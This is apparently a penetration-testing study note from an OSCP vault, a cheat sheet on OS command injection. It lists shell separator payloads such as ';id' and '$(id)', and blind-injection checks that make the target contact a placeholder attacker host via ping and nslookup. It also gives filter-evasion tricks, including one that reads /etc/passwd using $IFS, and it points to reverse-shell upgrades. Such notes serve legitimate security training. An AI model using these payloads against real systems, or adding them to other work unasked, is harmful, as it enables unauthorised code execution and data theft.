---
status: working
tags:
  - web
  - command-injection
  - rce
---
> *OS Command Injection:* Getting your own command to run when user input is passed into a system call. Reach for this on ping/nslookup tools, file converters, filename fields, and export features, anywhere the app shells out.

## Injection Separators

The separator ends or side-channels the app's intended command and starts yours.

```
;id      |id      `id`      $(id)      && id      || id      %0aid
```

> [!note]
> `;` and `&&` chain sequentially. Backticks and `$( )` substitute command output. `%0a` (newline) sometimes slips past filters that block `;` and `&`. `|` pipes the intended command's output into yours, which also works when the app only uses the first token.

## Confirm Blind Injection (no visible output)

When the app shows you nothing, prove execution by making the target reach out to you, then watch `tcpdump` or your listener for the callback.

```
; ping -c1 ATTACKER
; nslookup <unique>.ATTACKER
```

> [!note]
> DNS (`nslookup`) often escapes egress filtering that blocks raw ICMP or TCP, so it is the more reliable out-of-band confirmation on locked-down targets.

## Bypass Tricks when Characters are Filtered

These keep the command valid to the shell while defeating naive keyword and space filters. The shell strips the quotes and `$@`, and `$IFS` expands to whitespace.

```
w'h'o'a'm'i          (quotes broken through the word)
who$@ami             (empty variable expansion)
;cat$IFS/etc/passwd  ($IFS as a space substitute)
```

## See Also

- [[Web Enumeration]] for finding the injectable input
- [[Reverse Shells]] to upgrade RCE into an interactive shell (Base64-encode when the sink chokes on pipes)
- Source: [[OSCP Field Manual]] section 3.2
